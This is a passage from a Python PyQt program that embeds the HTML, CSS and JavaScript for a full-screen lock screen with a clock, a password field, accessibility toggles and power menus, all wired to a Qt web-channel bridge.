                                <path d="M4 12H20M20 12L14 6M20 12L14 18" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>
                    </div>
                    
                    <!-- Loading Animation Container -->
                    <div class="loading-container" id="loading-container">
                        <div class="loader">
                            <div class="circle"></div>
                            <div class="circle"></div>
                            <div class="circle"></div>
                            <div class="circle"></div>
                            <div class="circle"></div>
                        </div>
                        <div class="welcome-text">Welcome</div>
                    </div>
                </div>
                
                <!-- WiFi Menu -->
                <div class="slide-menu" id="wifi-menu">
                    <div class="menu-content">
                        <div class="wifi-info">
                            <div class="wifi-icon">
                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M1 9L12 2L23 9" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                    <path d="M5 12L12 7L19 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                    <path d="M9 15L12 13L15 15" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                    <circle cx="12" cy="18" r="1" fill="white"/>
                                </svg>
                            </div>
                            <div>
                                <p class="wifi-name">HomeNetwork_5G</p>
                                <p class="wifi-status">Connected</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Accessibility Menu -->
                <div class="slide-menu" id="accessibility-menu">
                    <div class="menu-content">
                        <div class="toggle-container">
                            <span>Screen Reader</span>
                            <label class="toggle-switch">
                                <input type="checkbox">
                                <span class="toggle-slider"></span>
                            </label>
                        </div>
                        <div class="toggle-container">
                            <span>High Contrast</span>
                            <label class="toggle-switch">
                                <input type="checkbox">
                                <span class="toggle-slider"></span>
                            </label>
                        </div>
                        <div class="toggle-container">
                            <span>Magnifier</span>
                            <label class="toggle-switch">
                                <input type="checkbox">
                                <span class="toggle-slider"></span>
                            </label>
                        </div>
                        <div class="toggle-container">
                            <span>Narrator</span>
                            <label class="toggle-switch">
                                <input type="checkbox">
                                <span class="toggle-slider"></span>
                            </label>
                        </div>
                        <div class="toggle-container">
                            <span>Closed Captions</span>
                            <label class="toggle-switch">
                                <input type="checkbox">
                                <span class="toggle-slider"></span>
                            </label>
                        </div>
                        <div class="toggle-container">
                            <span>Sticky Keys</span>
                            <label class="toggle-switch">
                                <input type="checkbox">
                                <span class="toggle-slider"></span>
                            </label>
                        </div>
                        <div class="toggle-container">
                            <span>Filter Keys</span>
                            <label class="toggle-switch">
                                <input type="checkbox">
                                <span class="toggle-slider"></span>
                            </label>
                        </div>
                    </div>
                </div>
                
                <!-- Power Menu -->
                <div class="slide-menu" id="power-menu">
                    <div class="menu-content">
                        <button class="menu-button" onclick="bridge.restart();">Restart</button>
                        <button class="menu-button" onclick="bridge.power_off();">Power Off</button>
                    </div>
                </div>
                
                <!-- Confirmation Dialog -->
                <div class="confirm-dialog" id="confirm-dialog">
                    <h3 id="confirm-message">Are you sure?</h3>
                    <div class="confirm-buttons">
                        <button class="confirm-button cancel" onclick="closeConfirmDialog()">Cancel</button>
                        <button class="confirm-button confirm" id="confirm-action">Confirm</button>
                    </div>
                </div>
                
                <!-- Alert Dialog -->
                <div class="alert-dialog" id="alert-dialog">
                    <h3 id="alert-message">Alert</h3>
                    <button class="alert-button" onclick="closeAlertDialog()">OK</button>
                </div>
            </div>
            
            <script src="qrc:///qtwebchannel/qwebchannel.js"></script>
            <script>
                // Initialize QWebChannel
                new QWebChannel(qt.webChannelTransport, function (channel) {{
                    window.bridge = channel.objects.bridge;
                }});
                
                // Update time
                function updateTime() {{
                    const now = new Date();
                    const hours = now.getHours().toString().padStart(2, '0');
                    const minutes = now.getMinutes().toString().padStart(2, '0');
                    const options = {{ weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }};
                    const dateStr = now.toLocaleDateString('en-US', options);
                    
                    document.getElementById('time').textContent = `${{hours}}:${{minutes}}`;
                    document.getElementById('date').textContent = dateStr;
                }}
                
                updateTime();
                setInterval(updateTime, 1000);
                
                // Elements
                const overlay = document.getElementById('overlay');
                const passwordContainer = document.getElementById('password-container');
                const passwordField = document.getElementById('password-field');
                const passwordFieldContainer = document.getElementById('password-field-container');
                const passwordIcon = document.getElementById('password-icon');
                const passwordEyeIcon = document.getElementById('password-eye-icon');
                const swipeHint = document.getElementById('swipe-hint');
                const loadingContainer = document.getElementById('loading-container');
                const errorMessage = document.getElementById('error-message');
                
                // Button elements
                const batteryButton = document.getElementById('battery-button');
                const wifiButton = document.getElementById('wifi-button');
                const accessibilityButton = document.getElementById('accessibility-button');
                const powerButton = document.getElementById('power-button');
                
                // Menu elements
                const wifiMenu = document.getElementById('wifi-menu');
                const accessibilityMenu = document.getElementById('accessibility-menu');
                const powerMenu = document.getElementById('power-menu');
                
                // Dialog elements
                const confirmDialog = document.getElementById('confirm-dialog');
                const alertDialog = document.getElementById('alert-dialog');
                const confirmMessage = document.getElementById('confirm-message');
                const alertMessage = document.getElementById('alert-message');
                const confirmAction = document.getElementById('confirm-action');
                
                // Double tap to unlock
                let lastTap = 0;
                document.addEventListener('click', function(event) {{
                    const currentTime = new Date().getTime();
                    const tapLength = currentTime - lastTap;
                    if (tapLength < 500 && tapLength > 0) {{
                        // Double tap detected
                        event.preventDefault();
                        showPasswordScreen();
                    }}
                    lastTap = currentTime;
                }});
                
                function showPasswordScreen() {{
                    // Animate overlay swipe up and fade out
                    overlay.classList.add('hidden');
                    
                    // After animation completes, show password screen
                    setTimeout(() => {{
                        passwordContainer.classList.add('visible');
                        passwordField.focus();
                        
                        // Update icons for password screen
                        batteryButton.style.display = 'none';
                        accessibilityButton.style.display = 'flex';
                        powerButton.style.display = 'flex';
                    }}, 700);
                }}
                
                // Password handling
                passwordField.addEventListener('keypress', (e) => {{
                    if (e.key === 'Enter') {{
                        const password = passwordField.value;
                        bridge.check_password(password);
                    }}
                }});
                
                // Password icon click
                passwordIcon.addEventListener('click', () => {{
                    const password = passwordField.value;
                    bridge.check_password(password);
                }});
                
                // Show/hide eye icon based on password field content
                passwordField.addEventListener('input', () => {{
                    if (passwordField.value.length > 0) {{
                        passwordEyeIcon.style.display = 'flex';
                    }} else {{
                        passwordEyeIcon.style.display = 'none';
                    }}
                }});
                
                // Hold to show password functionality
                passwordEyeIcon.addEventListener('mousedown', () => {{
                    passwordField.setAttribute('type', 'text');
                }});
                
                passwordEyeIcon.addEventListener('mouseup', () => {{
                    passwordField.setAttribute('type', 'password');
                }});
                
                passwordEyeIcon.addEventListener('mouseleave', () => {{
                    passwordField.setAttribute('type', 'password');
                }});
                
                // Touch events for mobile
                passwordEyeIcon.addEventListener('touchstart', (e) => {{
                    e.preventDefault();
                    passwordField.setAttribute('type', 'text');
                }});
                
                passwordEyeIcon.addEventListener('touchend', (e) => {{
                    e.preventDefault();
                    passwordField.setAttribute('type', 'password');
                }});
                
                function showPasswordError() {{
                    passwordField.classList.add('error');
                    setTimeout(() => {{
                        passwordField.classList.remove('error');
                        passwordField.value = '';
                        // Hide eye icon when field is cleared
                        passwordEyeIcon.style.display = 'none';
                    }}, 1000);
                }}
                
                // Show error message under username
                function showPasswordErrorWithButton() {{
                    // Show error message
                    errorMessage.classList.add('active');
                    
                    // Hide password field container
                    passwordFieldContainer.style.display = 'none';
                }}
                
                // Show welcome message and loading animation
                function showWelcomeAndLoading() {{
                    // Hide password field container
                    passwordFieldContainer.style.display = 'none';
                    
                    // Show loading container
                    loadingContainer.classList.add('visible');
                }}
                
                // Reset password screen
                function resetPasswordScreen() {{
                    // Hide error message
                    errorMessage.classList.remove('active');
                    
                    // Show password field container
                    passwordFieldContainer.style.display = 'flex';
                    
                    // Clear password field and focus
                    passwordField.value = '';
                    passwordField.focus();
                    
                    // Hide eye icon when field is cleared
                    passwordEyeIcon.style.display = 'none';
                }}
                
                // Menu functions
                function openMenu(menuId) {{
                    // Close all menus first
                    closeAllMenus();
                    
                    // Open the selected menu
                    const menu = document.getElementById(menuId);
                    menu.classList.add('active');
                }}
                
                function closeMenu(menuId) {{
                    const menu = document.getElementById(menuId);
                    menu.classList.remove('active');
                }}
                
                function closeAllMenus() {{
                    wifiMenu.classList.remove('active');
                    accessibilityMenu.classList.remove('active');
                    powerMenu.classList.remove('active');
                }}
                
                // Button click handlers
                wifiButton.addEventListener('click', (e) => {{
                    e.stopPropagation(); // Prevent event from bubbling up to document
                    openMenu('wifi-menu');
                }});
                
                accessibilityButton.addEventListener('click', (e) => {{
                    e.stopPropagation(); // Prevent event from bubbling up to document
                    openMenu('accessibility-menu');
                }});
                
                powerButton.addEventListener('click', (e) => {{
                    e.stopPropagation(); // Prevent event from bubbling up to document
                    openMenu('power-menu');
                }});
                
                // Close menu when clicking outside
                document.addEventListener('click', (e) => {{
                    // Check if any menu is active
                    const isAnyMenuActive = wifiMenu.classList.contains('active') || 
                                          accessibilityMenu.classList.contains('active') || 
                                          powerMenu.classList.contains('active');
                    
                    // If a menu is active and the click is outside the menu, close all menus
                    if (isAnyMenuActive && 
                        !e.target.closest('.slide-menu') && 
                        !e.target.closest('.icon-button')) {{
                        closeAllMenus();
                    }}
                }});
                
                // Prevent menu from closing when clicking inside it
                document.querySelectorAll('.slide-menu').forEach(menu => {{
                    menu.addEventListener('click', (e) => {{
                        e.stopPropagation(); // Prevent event from bubbling up to document
                    }});
                }});
                
                // Dialog functions
                function showConfirmDialog(message, action) {{
                    confirmMessage.textContent = message;
                    confirmDialog.classList.add('active');
                    
                    // Set the action for the confirm button
                    confirmAction.onclick = function() {{
                        bridge.handle_power_action(action);
                        closeConfirmDialog();
                    }};
                }}
                
                function closeConfirmDialog() {{
                    confirmDialog.classList.remove('active');
                }}
                
                function showAlert(message) {{
                    alertMessage.textContent = message;
                    alertDialog.classList.add('active');
                }}
                
                function closeAlertDialog() {{
                    alertDialog.classList.remove('active');
                }}
                
                // Update SSH message
                function updateSSHMessage(message) {{
                    const welcomeText = document.querySelector('.welcome-text');
                    if (welcomeText) {{
                        welcomeText.textContent = message;
                    }}
                }}
            </script>
        </body>
        </html>
        """
    
    def start_time_update(self):
        """Start the timer to update time in the web view"""
        self.timer = self.startTimer(1000)
    
    def timerEvent(self, event):
        """Update time in the web view"""
        self.web_view.page().runJavaScript("updateTime();")
    
    def fade_out_and_close(self):
        """Close the lock screen"""
        self.close()

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    lock_screen = WebLockScreen()
    lock_screen.show()
    lock_screen.showFullScreen()  # Add this line for full-screen
    
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()